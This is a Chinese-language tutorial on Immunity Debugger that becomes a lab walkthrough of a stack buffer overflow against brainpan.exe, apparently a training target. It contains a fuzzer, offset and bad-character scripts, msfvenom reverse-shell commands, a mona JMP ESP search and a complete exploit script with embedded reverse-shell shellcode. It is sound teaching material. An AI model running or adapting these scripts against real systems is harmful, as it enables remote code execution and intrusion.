
# immunity debugger

官网：https://debugger.immunityinc.com/

## 1、Immunity Debugger简介

　　Immunity Debugger软件专门用于加速漏洞利用程序的开发，辅助漏洞挖掘以及恶意软件分析。它具备一个完整的图形用户界面，同时还配备了迄今为止最为强的Python安全工具库。它巧妙的将动态调试功能与一个强大的静态分析引擎融合于一体，它还附带了一套高度可定制的纯pythont图形算法，可用于帮助我们绘制出直观的函数体控制流以及函数中的各个基本块。

## 2、软件介绍

### 2.1、主界面：
调试器界面被分成5个主要的块。
- 左上角的CPU窗口------显示了正在处理的代码的反汇编指令。
- 右上角是寄存器窗口------显示所有通用寄存器。
- 左下角是内存窗口---------以十六进制的形式显示任何被选中的内存块。
- 右下角是堆栈窗口---------显示调用的堆栈和解码后的函数参数（任何原生的API调用）。
- 最底下白色的窗口是命令栏-----能够像windbg一样使用命令控制调试器，或者执行PyCommands。

### 2.2、PyCommands命令

pycomands是我们在Immunity Debugger中执行Python代码扩展的主要途径。存放在Immunity安装目录的pyCommand文件夹里。是为了帮助用户在调试器内执行各种任务（如设立钩子函数、静态分析等）而特意编写的python脚本。

任何一个PyCommand命令都必须遵循一定结构规范：
　　1、必须定义一个main函数，并接受一个Python列表作为参数；
　　2、必须返回一个字符串：将被显示在调试器界面的状态栏。

按要求编写一个py脚本,放到pycomands目录下：
```
#!/usr/bin/python
#coding:utf-8
from immlib import *
def main(args):
    #实例化一个immlib.Debugger对象
    return "[*] PyCommand Executed!"
```
PS：PyCommand有两个必要条件：
- 一个main函数，只接受一个参数（由所有参数组成的python列表）。
- 另一个是在函数执行完成的时候必须返回一个字符串，最后更新在调试器主界面的状态栏。
- 执行命令之前在命令前加一个感叹号。`---------- ！<demo>`
### 2.3、PyHooks

Immunity调试器包含了13种不同类型的hook。，每一种hook都能单独实现，或者嵌入PyComm

- BpHook/LogBpHook
	- 当一个断点被触发的时候，这种hook就会被调用。两个hook很相似，  
	- 除了BpHook被触发的时候，会停止被调试的进程，而LogBpHook不会停止被调试的进程。

- AllExceptHook
	- 所有的异常的都会触发这个Hook.

- PostAnalysisHook
	- 在一个模块被分析完成的时候，这种hook就会被触发。这非常有用，当你在
	- 模块分析完成后需要进一步进行静态分析的时候。
	- 记住：在用immlib对一个模块进行函数和基础块的解码之前必须先分析这个模块。

- AccessViolationHook
	- 这个hook由访问违例触发。常用于在fuzz的时候自动化捕捉信息。

- LoadDLLHook/UnloadDLLHook
	- 当一个DLL被加载或者卸载的时候触发。

- CreateThreadHook/ExitThreadHook
	- 当一个新线程创建或者销毁的时候触发。

- CreateProcessHook/ExitProcessHook
	- 当目标进程开始或者结束的时候触发。

- FastLogHook/STDCALLFastLogHook
	- 这两种hook利用一个汇编跳转，将执行权限转移到一段hook代码用以记录特定的
    寄存器和内存数据。
    当函数被频繁的调用的时候，这种hook非常有用。

例子：以下的logBpHook例子代码块能够作为PyHook的模板：

```
from immlib import *
class MyHook(LogBpHook):
    def __init__(self):
        LogBpHook.__init__(self)
    def run(regs):
        #Executed when hook gets triggered
```

重载了LogBpHook类，并且必须建立了run()函数。当hook被触发的时候，所有的CPU寄存器，以及指令都将被

存入regs,此时我们就可以修改它们了。regs是一个字典。如下访问相应寄存器的值：regs["ESP"]。

　　hook可以定义在PyCommand里，随时调用。也可以写成脚本放入PyHooks目录下。每次启动immunity都会自动加载这些目录。

## 3、安装参考：

```
https://blog.csdn.net/clark3256453/article/details/121422527 
```
## 4、使用方法

案例：
- https://blog.csdn.net/weixin_65527369/article/details/126914721
- https://blog.csdn.net/text2206/article/details/128404544

### 1、将exe程序拖入immunity debugger中打开

这个步骤是将此文件运行起来，并且放入此软件中进行状态监控，相当于将服务启动起来了，可以通过正常的方式进行访问和链接

然后点击上方导航栏的运行按钮(红色三角按钮)，查看exe运行效果（在点击前，程序的运行是处于被截断中的）

然后测试能否正常连接服务

```
nc <ip> <port>
```
### 2、模糊测试漏洞

#### 用脚本暴力输入判断

写一个测试python脚本：fuzz.py
```python
#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be started at 100 and increment by 100 until it reaches 4000, or until Brainpan.exe crashes.

buff=["A"]

# Maximum size of buffer.

max_buffer = 4000

# Initial counter value.

counter = 100

# Value to increment per attempt.

increment = 100


while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s 192.168.132.5 9999" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash brainpan.exe at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.send(string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed. Make sure IP/port are correct, or check debugger for brainpan.exe crash."
        sys.exit()

```

这一步的目的是借助批量产生的无意义的字符来冲击文件，可以得知是否存在溢出的可能，执行脚本

```
python2 brainfuzzer.py 192.168.3.101 9999
```

看到连接中断，那么就说明存在溢出，再看immunity debugger，左上角CPU窗口已经变黑崩溃了

#### 根据%s模糊判断

使用了“%s”，可以看作缓冲区溢出的一个标志
```
strings brainpan.exe|grep %s
[get_reply] s = [%s]
```
### 4、判断溢出点
用大量字符发送给文件测试溢出点

生成大量字符
```
#查找工具的绝对路径
locate pattern_create.rb

#用工具生成可以反查的字符
/usr/share/metasploit-framework/tools/exploit/pattern_cre
ate.rb -l 1000   --生成1000位的可以反查的字符

复制下来,然后粘贴到OverflowJudgment.py在运行
```
OverflowJudgment.py
```
#!/usr/bin/python
import time, struct, sys
import socket as so

pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(pattern + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()
```
运行
```
python2 OverflowJudgment.py 192.168.3.101 9999
```

观察被覆盖的位置：EIP被35724134覆盖

计算溢出点（也叫偏移量）即开始溢出的字节位置
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 1000
[*] Exact match at offset 524    即524为溢出点
```

### 5、探测shellcode空间大小

也就是查找后续溢出空间，接下来就是要让这一段内存地址指向我们的shellcode，因为当发生溢出的情况时，系统就会自动调用这一段内存，这一段内存里面存放的是下一跳的信息，他的本意是不因为溢出而产生计算机崩溃，而让程序继续进行，所以我们只需要知道他下一跳的地址以及大小，然后我们构造相对应的shellcode

524个字节填满他正常的内存空间，而后就会造成溢出，用B填满他的指向（四个字符），剩下整这么多C就是shellcode的内存可存放大小，借助工具我们就可以知道shellcode可以放多少字节（也就是说我们要知道他最终的内存中保留下来了多少C）
shellcodesize.py
```
#!/usr/bin/python
import time, struct, sys
import socket as so

buff = "A" * 524 + "B" * 4 + (2000 - 524 - 4) * "C"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(buff + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()
```

执行
```
python2 brainpan2.py 192.168.3.101 9999
```

在ASCII表[https://c.runoob.com/front-end/6318/]中（或在kali 中 执行ascii命令也可以查看）
		字母与十六进制的对照为：
			41 A
			42 B
			43 C

在右下角的第二列中，

在右上角区域看到
	EIP均被B覆盖，
	EBP均被A覆盖，
	ESP的位置 右键 > Follow in dump，在左下视图右键选择HEX-HEX/ASCII(16)，选择16个字节一行去观察

![](https://minioapi.nerubian.cn/image/20250329174740212.png)

也可以到右下角窗口中进行确定，找43数据部分的起点和终点

![](https://minioapi.nerubian.cn/image/20250329174747496.png)

![](https://minioapi.nerubian.cn/image/20250329174751987.png)

被43（C）溢出的区域中，
	起始位置 005FF910 
	结束位置 005FFAE4

在  [在线计算器| 菜鸟工具](https://c.runoob.com/front-end/6904/)  用结束位置 - 起始位置，计算43部分的大小，以确定是否可以存放PAYLOAD
	结果为：468位

```
#!/bin/bash

# 将十六进制转换为十进制并进行减法运算
result_dec=$(printf "%d" $(( 0x$1 - 0x$2 )))

# 将结果转换回十六进制
result_hex=$(printf "%X\n" $result_dec)

echo "$1 - $2 in hexadecimal: $result_hex" # 结果以十六进制输出
echo "$1 - $2 in decimal: $result_dec" # 结果以十进制输出
```
使用
```
sh test.sh 005FFAE4 005FF910
005FFAE4 - 005FF910 in hexadecimal: 1D4
005FFAE4 - 005FF910 in decimal: 468
```


### 6、查找坏字符
所谓的坏字节就是00不连续的
不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途：
- 1\. 返回地址、shellcode、buffer中都不能出现坏字符
- 2\. null byte (0x00)空字符，用于终止字符串的拷贝操作
- 3\. return (0x0D)回车操作，表示POP3 PASS命令输入完成 
思路： 发送0x00–0xff 256个字符，查找所有坏字符 例如：计算机都用ASCII编码不同的编码都表示不同的字符，一个字符一个字节 00000000—11111111=256 有256种可能的字符情况,除了0x00，因为无论何时何地，他都是坏字符

开源的坏字符payload工具：https://github.com/cytopia/badchars
```
git clone https://github.com/cytopia/badchars.git
```
使用
```
./badchars
./badchars -f ruby
```
组装测试脚本BadCharacterTest.py
```
#!/usr/bin/python
import time, struct, sys
import socket as so

badchars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

buff = "A" * 524 + "B" * 4 + badchars

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(buff + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()

```
执行
```
python2 BadCharacterTest.py 10.211.55.44 9999
```
在右下角查看
![](https://minioapi.nerubian.cn/image/20250329174831173.png)

从右往左读，发现均为正常显示，除了0x00，因为无论何时何地，他都是坏字符

### 6、msf生成payload

```
msfvenom -p windows/shell_reverse_tcp   LPORT=1234 LHOST=192.168.56.124 -e x86/shikata_ga_nai -b "\x00" -f py
msfvenom -p linux/x86/shell_reverse_tcp LPORT=1234 LHOST=192.168.56.124 -e x86/shikata_ga_nai -b "\x00" -f py

	-b  指定坏字符
	-f  指定脚本的语言，可以用：py、c
```

### 7、定位JMP ESP位置
因为ESP的地址会变化，这是系统的保护机制，所以我们要找一种可以精确的百分百定位到shellcode的东西，这个东西是JMP ESP  
接着引入mona脚本（识别内存模块的脚本）

1、下载了 Mona 脚本文件
- https://github.com/corelan/mona 下载最新版本的 Mona 脚本。
  

2、将下载的 Mona.py 文件复制到 Immunity Debugger 的 PyCommands 文件夹中。通常情况下，这个文件夹位于 Immunity Debugger 安装目录下的 PyCommands 子文件夹中。
    
3、打开 Immunity Debugger。在最下方的命令行窗口中输入以下命令加载 Mona 脚本：
```diff
!mona modules
```
最上面ASLR等是保护机制，我们要找一个均是false的，往回看就是这个exe文件，在实际操作中也可能是DLL进程文件，具体问题具体分析

![](https://minioapi.nerubian.cn/image/20250329174904558.png)

查询到jmp esp字符在内存中的标志名称来查找位置

```
locate nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000 FFE4 jmp esp
```
FFE4是jmp esp的操作代码

利用mona脚本来查找当前文件中jmp esp的存在位置, -m 模块，红色字体提示找到一个指针

```
!mona find -s "\xff\xe4" -m brainpan.exe
```
![](https://minioapi.nerubian.cn/image/20250329174924592.png)

得到结果如下 311712F3  
获得是JMP ESP地址 ：0x311712F3
由于内存是后进先出机制，需要反向写，所以内存地址为：`\xf3\x12\x17\x31`

### 8、组装最终利用脚本

```
#!/usr/bin/python
import time, struct, sys
import socket as so

#Command used for Windows Payload.. replace with your IP - msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.90.5 -e x86/shikata_ga_nai -b "\x00" -f py

buf =  ""
buf += "\xdb\xd9\xbe\x43\x0e\xb2\x62\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x13\x03\x33\x1d\x50"
buf += "\x97\x4f\xc9\x16\x58\xaf\x0a\x77\xd0\x4a\x3b\xb7\x86"
buf += "\x1f\x6c\x07\xcc\x4d\x81\xec\x80\x65\x12\x80\x0c\x8a"
buf += "\x93\x2f\x6b\xa5\x24\x03\x4f\xa4\xa6\x5e\x9c\x06\x96"
buf += "\x90\xd1\x47\xdf\xcd\x18\x15\x88\x9a\x8f\x89\xbd\xd7"
buf += "\x13\x22\x8d\xf6\x13\xd7\x46\xf8\x32\x46\xdc\xa3\x94"
buf += "\x69\x31\xd8\x9c\x71\x56\xe5\x57\x0a\xac\x91\x69\xda"
buf += "\xfc\x5a\xc5\x23\x31\xa9\x17\x64\xf6\x52\x62\x9c\x04"
buf += "\xee\x75\x5b\x76\x34\xf3\x7f\xd0\xbf\xa3\x5b\xe0\x6c"
buf += "\x35\x28\xee\xd9\x31\x76\xf3\xdc\x96\x0d\x0f\x54\x19"
buf += "\xc1\x99\x2e\x3e\xc5\xc2\xf5\x5f\x5c\xaf\x58\x5f\xbe"
buf += "\x10\x04\xc5\xb5\xbd\x51\x74\x94\xa9\x96\xb5\x26\x2a"
buf += "\xb1\xce\x55\x18\x1e\x65\xf1\x10\xd7\xa3\x06\x56\xc2"
buf += "\x14\x98\xa9\xed\x64\xb1\x6d\xb9\x34\xa9\x44\xc2\xde"
buf += "\x29\x68\x17\x70\x79\xc6\xc8\x31\x29\xa6\xb8\xd9\x23"
buf += "\x29\xe6\xfa\x4c\xe3\x8f\x91\xb7\x64\x70\xcd\xed\x71"
buf += "\x18\x0c\x11\x7b\x63\x99\xf7\x11\x83\xcc\xa0\x8d\x3a"
buf += "\x55\x3a\x2f\xc2\x43\x47\x6f\x48\x60\xb8\x3e\xb9\x0d"
buf += "\xaa\xd7\x49\x58\x90\x7e\x55\x76\xbc\x1d\xc4\x1d\x3c"
buf += "\x6b\xf5\x89\x6b\x3c\xcb\xc3\xf9\xd0\x72\x7a\x1f\x29"
buf += "\xe2\x45\x9b\xf6\xd7\x48\x22\x7a\x63\x6f\x34\x42\x6c"
buf += "\x2b\x60\x1a\x3b\xe5\xde\xdc\x95\x47\x88\xb6\x4a\x0e"
buf += "\x5c\x4e\xa1\x91\x1a\x4f\xec\x67\xc2\xfe\x59\x3e\xfd"
buf += "\xcf\x0d\xb6\x86\x2d\xae\x39\x5d\xf6\xde\x73\xff\x5f"
buf += "\x77\xda\x6a\xe2\x1a\xdd\x41\x21\x23\x5e\x63\xda\xd0"
buf += "\x7e\x06\xdf\x9d\x38\xfb\xad\x8e\xac\xfb\x02\xae\xe4"

#JMP ESP address is 311712F3
payload = "A" * 524 + "\xf3\x12\x17\x31" + (900 - 524 - 4 - int(len(buf))) * "\x90" + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 9999" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(payload + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()

```

### 9、执行利用

开启反弹shell监听
```
nc -nvlp 443
```

执行payload利用脚本

```
python2 exploit.py 10.238.52.97 9999
```